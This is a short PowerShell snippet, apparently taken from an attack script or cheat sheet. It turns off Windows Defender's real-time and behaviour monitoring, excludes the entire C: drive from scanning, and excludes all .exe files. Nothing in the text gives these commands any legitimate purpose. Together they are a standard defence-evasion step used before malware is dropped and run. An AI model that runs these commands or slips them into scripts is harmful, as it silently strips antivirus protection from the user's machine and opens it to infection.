Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Add-MpPreference -ExclusionPath C:
Add-MpPreference -ExclusionExtension ".exe"
